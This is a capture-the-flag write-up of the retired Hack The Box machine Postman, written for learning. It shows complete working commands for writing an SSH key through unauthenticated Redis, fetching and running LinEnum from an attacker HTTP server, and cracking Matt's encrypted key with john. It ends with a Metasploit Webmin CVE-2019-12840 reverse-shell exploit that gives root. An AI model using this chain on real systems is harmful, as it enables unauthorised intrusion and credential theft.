# HackTheBox: Postman

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **Machine** | Postman |
| **OS** | Linux (Ubuntu 18.04) |
| **Difficulty** | Easy |
| **IP** | 10.129.2.1 |
| **Status** | Retired ✅ |
| **Date** | April 2026 |

---

## Machine Summary

Postman features a Redis server running with no authentication: abused to write an SSH public key directly into the filesystem, granting initial access as the redis user. Post-exploitation enumeration with LinEnum uncovers an encrypted SSH private key backup belonging to user Matt. The key is cracked offline with ssh2john and john. Direct SSH login is blocked for Matt via a `DenyUsers` directive in `sshd_config`, so lateral movement happens locally via `su`. Privilege escalation exploits a vulnerable Webmin 1.910 instance via Metasploit (CVE-2019-12840), landing a root shell.

**Skills demonstrated:**
- Redis unauthenticated file write exploitation via `CONFIG SET`
- SSH public key injection via Redis memory dump
- Encrypted SSH private key cracking with `ssh2john` + `john`
- `sshd_config` DenyUsers restriction: understanding and bypassing via `su`
- Webmin 1.910 authenticated RCE (CVE-2019-12840) via Metasploit

---

## Attack Chain Summary

```
Nmap → Redis(6379) no auth, SSH(22), HTTP(80), Webmin(10000) 1.910
ssh-keygen → prepare public key with \n\n padding → key.txt
cat key.txt | redis-cli -x set ssh_key → key in Redis memory
CONFIG SET dir /var/lib/redis/.ssh → CONFIG SET dbfilename authorized_keys → save
ssh -i redis redis@10.129.2.1 → shell as redis
LinEnum → /opt/id_rsa.bak found (owned by Matt, world-readable, encrypted)
ssh2john id_rsa.bak > hash.txt → john hash.txt rockyou.txt → computer2008
ssh -i id_rsa.bak matt@IP → Permission denied (DenyUsers Matt in sshd_config)
su - matt → password: computer2008 → shell as matt → user.txt
msfconsole → webmin_package_updates_rce → USERNAME=matt PASSWORD=computer2008
→ root shell → cat /root/root.txt
```

---

## Step 1: Nmap Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- -T4 --min-rate=1000 -sC -sV 10.129.2.1 -oN postman_nmap.txt
```

| Flag | Purpose |
|---|---|
| `-p-` | Scan all 65535 ports: non-standard ports like 10000 missed by default |
| `-T4` | Aggressive timing |
| `--min-rate=1000` | Send minimum 1000 packets/sec: significantly speeds up `-p-` |
| `-sC` | Default NSE scripts: banners, versions, basic checks |
| `-sV` | Version detection: critical for CVE identification |
| `-oN` | Save output to file |

**Output:**

```
Hackerpatel007_1@htb[/htb]$ nmap -p- -T4 --min-rate=1000 -sC -sV 10.129.2.1

Starting Nmap 7.94
Nmap scan report for 10.129.2.1
Host is up (0.088s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Login to Webmin
Service Info: OS: Linux; CPE: cpe:/o:ubuntu:linux

Nmap done: 1 IP address (1 host up)
```

**Analysis:**

| Port | Service | What It Tells Us |
|---|---|---|
| 22 | OpenSSH 7.6p1 | Final access vector: needs credentials or key |
| 80 | Apache 2.4.29 | Web app: check for info but not primary path |
| 6379 | Redis 4.0.9 | No auth banner: unauthenticated file write exploitation possible |
| 10000 | MiniServ 1.910 | Webmin: CVE-2019-12840 known RCE once authenticated |

Two attack vectors are immediately visible: Redis with no authentication, and Webmin 1.910 with a known CVE. Redis gives initial access. Webmin gives root.

---

## Step 2: Redis Exploitation: SSH Key Injection

### Why Redis Is Dangerous Without Authentication

Redis was designed for internal networks and has no authentication by default. The `CONFIG SET` command allows changing where Redis saves its memory dump to disk. By controlling both the directory and filename, an attacker can write arbitrary content anywhere the Redis process has write permission. If the Redis process runs as the redis user and that user has a home directory, writing to `~/.ssh/authorized_keys` grants SSH access with no password required.

The three-step file write chain:

```
SET key "content"                     → put content into Redis memory
CONFIG SET dir /var/lib/redis/.ssh    → change where the dump file lands
CONFIG SET dbfilename authorized_keys → change the dump filename
save                                  → write memory to disk
```

### Generate SSH Keypair

```bash
Hackerpatel007_1@htb[/htb]$ ssh-keygen -t rsa -f redis
```

Output: two files created:

```
Generating public/private rsa key pair.
Your identification has been saved in redis
Your public key has been saved in redis.pub
```

| File | Purpose |
|---|---|
| `redis` | Private key: keep this, use it to login |
| `redis.pub` | Public key: inject this into the target |

### Prepare the Key with Padding

```bash
Hackerpatel007_1@htb[/htb]$ (echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt
```

Redis writes its entire memory dump to disk when `save` runs. The dump contains Redis internal header bytes, metadata, and all key-value pairs. SSH is strict about `authorized_keys` format: if the public key line is not cleanly separated from surrounding content, SSH ignores it entirely. The `\n\n` padding on both sides ensures the key is on its own clean line regardless of what Redis metadata surrounds it.

Verify the prepared key:

```bash
Hackerpatel007_1@htb[/htb]$ cat key.txt

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...htb@kali

```

### Inject Key into Redis Memory

```bash
Hackerpatel007_1@htb[/htb]$ cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
OK
```

| Part | Purpose |
|---|---|
| `cat key.txt` | Output the padded key |
| `\|` | Pipe as stdin to redis-cli |
| `-h 10.129.2.1` | Target Redis server |
| `-x` | Read the SET value from stdin |
| `set ssh_key` | Create key named ssh_key with the key content |

Redis memory now holds the public key. Nothing written to disk yet.

### Configure Save Location and Write

```bash
Hackerpatel007_1@htb[/htb]$ redis-cli -h 10.129.2.1
```

Output:
```
10.129.2.1:6379>
```

No auth prompt. Immediate access confirmed. Now configure and write:

```
10.129.2.1:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> CONFIG SET dbfilename authorized_keys
OK
10.129.2.1:6379> save
OK
```

| Command | What It Does |
|---|---|
| `CONFIG SET dir /var/lib/redis/.ssh` | Change save directory from default `/var/lib/redis/` to the redis user's `.ssh` folder |
| `CONFIG SET dbfilename authorized_keys` | Change save filename from `dump.rdb` to `authorized_keys` |
| `save` | Write all Redis memory to `/var/lib/redis/.ssh/authorized_keys` |

Both `CONFIG SET` commands returned `OK`: the directory exists and the Redis process has write permission.

### SSH as redis

```bash
Hackerpatel007_1@htb[/htb]$ ssh -i redis redis@10.129.2.1
```

Output:
```
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

**Initial shell as redis ✅**

---

## Step 3: Post-Exploitation Enumeration

Transfer and run LinEnum for automated enumeration:

```bash
# On Kali: serve LinEnum
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000

# On target: download and execute
redis@Postman:~$ cd /tmp
redis@Postman:/tmp$ wget http://10.10.x.x:8000/LinEnum.sh
redis@Postman:/tmp$ chmod +x LinEnum.sh
redis@Postman:/tmp$ ./LinEnum.sh
```

Critical finding from LinEnum output:

```
[-] Location and Permissions of .bak files:
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-rw------- 1 root root  709 Oct 25  2019 /var/backups/group.bak
-rw------- 1 root shadow 588 Oct 25  2019 /var/backups/gshadow.bak
```

Two critical observations:

| Observation | Significance |
|---|---|
| `/opt/id_rsa.bak` owned by Matt | This is Matt's SSH private key backup |
| Permissions `rwxr-xr-x` = world-readable | Readable by the redis user right now |

```bash
redis@Postman:~$ cat /opt/id_rsa.bak
```

Output:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwSoFOeqkr5SyR4oLCLcKhOz8iJKxhslOLnfgFfF8MGr+5HGNP7Jg0DmHNA...
-----END RSA PRIVATE KEY-----
```

Reading the key header:

| Line | Meaning |
|---|---|
| `Proc-Type: 4,ENCRYPTED` | The key is password-protected |
| `DEK-Info: DES-EDE3-CBC,...` | Encrypted with Triple DES: offline crackable |

The private key cannot be used directly. The password protecting it must be cracked first.

---

## Step 4: Crack the Encrypted SSH Private Key

Copy the key to Kali, then crack it:

```bash
Hackerpatel007_1@htb[/htb]$ nano id_rsa.bak
# Paste the full key including -----BEGIN RSA PRIVATE KEY----- and -----END RSA PRIVATE KEY-----
```

Extract crackable hash:

```bash
Hackerpatel007_1@htb[/htb]$ ssh2john id_rsa.bak > hash.txt
Hackerpatel007_1@htb[/htb]$ cat hash.txt
id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb02c9a6d5...
```

`ssh2john` extracts the encrypted portions and encryption parameters (algorithm, IV) from the key and formats them as a hash that John the Ripper can brute force. The `$sshng$` prefix identifies it as an SSH key hash using DES-EDE3-CBC.

Crack with rockyou:

```bash
Hackerpatel007_1@htb[/htb]$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Output:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
1g 0:00:00:03 DONE
Session completed
```

**Passphrase cracked: `computer2008`**

---

## Step 5: Lateral Movement to Matt

Set correct key permissions and attempt SSH:

```bash
Hackerpatel007_1@htb[/htb]$ chmod 600 id_rsa.bak
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa.bak matt@10.129.2.1
```

Output:
```
matt@10.129.2.1: Permission denied (publickey).
```

SSH is blocked for Matt. Checking `sshd_config` explains why:

```bash
redis@Postman:~$ cat /etc/ssh/sshd_config | grep -i deny
DenyUsers Matt
```

`DenyUsers` is an SSH server directive that completely blocks the specified user from authenticating via SSH: regardless of valid keys or correct passwords. The server rejects the connection before credentials are even checked.

The key distinction: `DenyUsers` only blocks SSH network login. It does **NOT** affect local authentication methods. `su`, `sudo`, and console login all bypass it entirely. Being already on the machine as redis means `su` is always an option.

```bash
redis@Postman:~$ su - matt
Password: computer2008
```

Output:
```
matt@Postman:~$
```

**Shell as matt ✅**

The `-` after `su` loads Matt's full environment: home directory, PATH, shell settings. Without `-`, you switch user identity but stay in redis's environment. Always use `su -` for a clean context.

```bash
matt@Postman:~$ cat user.txt
```

**User flag captured ✅**

---

## Step 6: Privilege Escalation via Webmin 1.910 (CVE-2019-12840)

Webmin 1.910 is vulnerable to an authenticated command injection vulnerability in the Package Updates module. The `u` POST parameter does not sanitise input: OS commands injected there execute as root because Webmin itself runs as root. Any authenticated Webmin user can trigger this, including low-privilege accounts.

Matt has a Webmin account using the same password (`computer2008`) as his system account: credential reuse across system and application login.

```bash
Hackerpatel007_1@htb[/htb]$ msfconsole -q

msf6 > search webmin_package_updates

   #  Name                                                Disclosure Date  Rank
   -  ----                                                ---------------  ----
   0  exploit/linux/http/webmin_package_updates_rce       2019-09-10       excellent

msf6 > use exploit/linux/http/webmin_package_updates_rce
```

Set options:

```
msf6 exploit(linux/http/webmin_package_updates_rce) > set RHOSTS 10.129.2.1
msf6 exploit(linux/http/webmin_package_updates_rce) > set LHOST 10.10.x.x
msf6 exploit(linux/http/webmin_package_updates_rce) > set LPORT 4444
msf6 exploit(linux/http/webmin_package_updates_rce) > set USERNAME matt
msf6 exploit(linux/http/webmin_package_updates_rce) > set PASSWORD computer2008
msf6 exploit(linux/http/webmin_package_updates_rce) > set SSL true
msf6 exploit(linux/http/webmin_package_updates_rce) > run
```

| Option | Value | Purpose |
|---|---|---|
| `RHOSTS` | Target IP | Machine being exploited |
| `LHOST` | Your tun0 VPN IP | Where the reverse shell connects back: must be HTB VPN IP |
| `LPORT` | 4444 | Listener port on your machine |
| `USERNAME` | matt | Valid Webmin account |
| `PASSWORD` | computer2008 | Cracked password: reused on Webmin |
| `SSL` | true | Webmin on port 10000 uses HTTPS |

> **LHOST must be your tun0 VPN IP**: not your LAN IP. The target machine is on HTB's network and can only reach you through the VPN tunnel. Check with `ip addr show tun0`.

Output:
```
[*] Started reverse TCP handler on 10.10.x.x:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Attempting login with matt:computer2008
[+] Logged in!
[*] Sending payload...
[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.2.1:45392)

id
uid=0(root) gid=0(root) groups=0(root)
```

**Root shell ✅**

```bash
cat /root/root.txt
```

**Root flag captured ✅**

---

## Lessons Learned

The Redis file write exploit is one of the cleanest examples of a feature-as-vulnerability in this path. `CONFIG SET` was designed for legitimate administration: changing where Redis stores data at runtime. Without authentication, any network-accessible Redis instance hands an attacker full control over where the process writes files. The key insight is that writing to `.ssh/authorized_keys` works because the Redis process runs as the redis user and has write permission to its own home directory. The `\n\n` padding was the detail that almost broke the exploit: SSH is far stricter about `authorized_keys` formatting than most people expect.

The `DenyUsers Matt` directive in `sshd_config` was a deliberate machine design choice that teaches an important concept. `DenyUsers` blocks SSH network authentication only. It does not touch PAM, `su`, `sudo`, or any other local authentication method. Once on the machine as any user, `su -` with a found password bypasses SSH restrictions entirely. The lesson is never to assume a credential is useless just because one authentication vector is blocked: always try it on every available surface.

The Webmin credential reuse was the most realistic finding in this machine. Matt used the same password for his system account, his SSH key passphrase, and his Webmin web application login. In real engagements, credential reuse across system and application logins is one of the most common single findings. Every recovered password gets tested against every available service.

The LinEnum approach to finding `/opt/id_rsa.bak` was the right tool for the situation. The file was world-readable but in a non-obvious location. Manually checking every directory for `.bak` files would have been slow. LinEnum's explicit `.bak` file location check surfaced it in the first pass. Running a structured enumeration script immediately after getting a shell: before doing anything manual: consistently finds things that manual exploration misses.

---

## Full Attack Chain Reference

```
1.  nmap -p- -T4 --min-rate=1000 -sC -sV 10.129.2.1
    → Redis(6379) no auth, SSH(22), HTTP(80), Webmin(10000) 1.910: Ubuntu 18.04

2.  ssh-keygen -t rsa -f redis
    → redis (private key) + redis.pub (public key)

3.  (echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt
    → Public key padded with newlines for clean authorized_keys injection

4.  cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
    → Key injected into Redis memory as value of ssh_key

5.  redis-cli -h 10.129.2.1
    CONFIG SET dir /var/lib/redis/.ssh
    CONFIG SET dbfilename authorized_keys
    save
    → /var/lib/redis/.ssh/authorized_keys written with public key

6.  ssh -i redis redis@10.129.2.1
    → Shell as redis ✅

7.  wget http://10.10.x.x:8000/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
    → /opt/id_rsa.bak found: owned by Matt, world-readable, encrypted

8.  cat /opt/id_rsa.bak → copy to Kali as id_rsa.bak

9.  ssh2john id_rsa.bak > hash.txt
    john hash.txt --wordlist=rockyou.txt
    → computer2008

10. chmod 600 id_rsa.bak
    ssh -i id_rsa.bak matt@10.129.2.1
    → Permission denied: DenyUsers Matt in /etc/ssh/sshd_config

11. redis@Postman:~$ su - matt  (password: computer2008)
    → Shell as matt ✅
    → cat ~/user.txt ✅

12. msfconsole → use exploit/linux/http/webmin_package_updates_rce
    RHOSTS=10.129.2.1, LHOST=10.10.x.x, USERNAME=matt, PASSWORD=computer2008, SSL=true
    run → root shell ✅

13. cat /root/root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p- -T4 --min-rate=1000 -sC -sV <IP>` | Full port scan: all 65535 ports with version detection |
| `ssh-keygen -t rsa -f redis` | Generate RSA keypair named redis |
| `(echo -e "\n\n"; cat redis.pub; echo -e "\n\n") > key.txt` | Pad public key with newlines for clean injection |
| `cat key.txt \| redis-cli -h <IP> -x set ssh_key` | Inject padded key into Redis memory |
| `redis-cli -h <IP>` | Connect to Redis (no auth if unauthenticated) |
| `CONFIG GET dir` | Check current Redis save directory |
| `CONFIG SET dir /var/lib/redis/.ssh` | Redirect Redis save location to ssh directory |
| `CONFIG SET dbfilename authorized_keys` | Set save filename to authorized_keys |
| `save` | Write Redis memory dump to disk |
| `ssh -i redis redis@<IP>` | SSH using injected key |
| `python3 -m http.server 8000` | Serve LinEnum.sh from Kali |
| `wget http://<IP>:8000/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh` | Download and run LinEnum |
| `cat /opt/id_rsa.bak` | Read world-readable encrypted private key backup |
| `ssh2john id_rsa.bak > hash.txt` | Extract crackable hash from encrypted SSH key |
| `john hash.txt --wordlist=rockyou.txt` | Crack SSH key passphrase |
| `chmod 600 id_rsa.bak` | Set correct key permissions |
| `ssh -i id_rsa.bak matt@<IP>` | Attempt SSH with Matt's key (blocked by DenyUsers) |
| `cat /etc/ssh/sshd_config \| grep -i deny` | Confirm DenyUsers restriction |
| `su - matt` | Switch to Matt locally: bypasses SSH DenyUsers |
| `msfconsole -q` | Launch Metasploit quietly |
| `use exploit/linux/http/webmin_package_updates_rce` | Load Webmin CVE-2019-12840 module |
| `set SSL true` | Required: Webmin on port 10000 uses HTTPS |
| `ip addr show tun0` | Get your HTB VPN IP for LHOST |
